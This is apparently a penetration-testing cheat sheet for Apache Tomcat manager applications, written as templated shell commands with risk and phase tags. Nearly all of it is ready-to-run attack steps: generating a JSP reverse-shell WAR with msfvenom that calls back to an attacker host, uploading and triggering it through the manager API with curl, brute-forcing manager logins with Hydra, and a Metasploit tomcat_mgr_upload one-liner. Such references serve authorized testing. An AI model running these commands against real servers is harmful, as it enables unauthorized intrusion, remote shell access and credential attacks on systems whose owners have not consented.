# Apache Tomcat

> Enumerate, deploy, and exploit Apache Tomcat manager applications

<!-- tags: tomcat, java, war, manager, web, exploit -->

---

## List Deployed Applications
Use the manager text interface to list deployed contexts and their state.

```bash
curl -u '{{USERNAME:str:tomcat}}:{{PASSWORD:str:tomcat}}' {{URL:url:http://target:8080}}/manager/text/list
```

<!-- meta: risk=low | phase=enum | tags=tomcat,manager,list -->

---

## Generate Reverse Shell WAR (msfvenom)
Create a JSP reverse-shell WAR ready for upload.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST:ip}} LPORT={{LPORT:port:4444}} -f war > {{WAR:file:shell.war}}
```

<!-- meta: risk=high | phase=exploit | tags=msfvenom,war,jsp -->

---

## Deploy WAR via Manager (curl PUT)
Upload and deploy a WAR file using the Tomcat Manager text API.

```bash
curl -X PUT -u '{{USERNAME:str}}:{{PASSWORD:str}}' '{{URL:url:http://target:8080}}/manager/text/deploy?path=/{{CONTEXT:str:shell}}&war={{WAR:file:shell.war}}' -T {{WAR:file:shell.war}}
```

<!-- meta: risk=high | phase=exploit | tags=tomcat,deploy,war,put -->

---

## Trigger Deployed WAR
Hit the deployed context to fire the embedded payload.

```bash
curl -u '{{USERNAME:str}}:{{PASSWORD:str}}' '{{URL:url:http://target:8080}}/{{CONTEXT:str:shell}}' -L
```

<!-- meta: risk=high | phase=exploit | tags=tomcat,trigger,war -->

---

## Undeploy Application via Manager
Remove a deployed context from the Tomcat manager.

```bash
curl -u '{{USERNAME:str}}:{{PASSWORD:str}}' '{{URL:url:http://target:8080}}/manager/text/undeploy?path=/{{CONTEXT:str:shell}}'
```

<!-- meta: risk=med | phase=exploit | tags=tomcat,undeploy,cleanup -->

---

## Brute Force Tomcat Manager (Hydra)
Spray credentials against the manager's HTTP basic auth.

```bash
hydra -L {{USERLIST:wordlist}} -P {{PASSLIST:wordlist}} {{TARGET:ip}} -s {{PORT:port:8080}} http-get /manager/html
```

<!-- meta: risk=med | phase=passwords | tags=tomcat,hydra,manager,brute -->

---

## Metasploit Tomcat Manager Upload
Use Metasploit's tomcat_mgr_upload module for full exploitation.

```bash
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {{TARGET:ip}}; set RPORT {{PORT:port:8080}}; set HttpUsername {{USERNAME:str}}; set HttpPassword {{PASSWORD:str}}; set LHOST {{LHOST:ip}}; set LPORT {{LPORT:port:4444}}; run"
```

<!-- meta: risk=high | phase=exploit | tags=metasploit,tomcat,upload -->
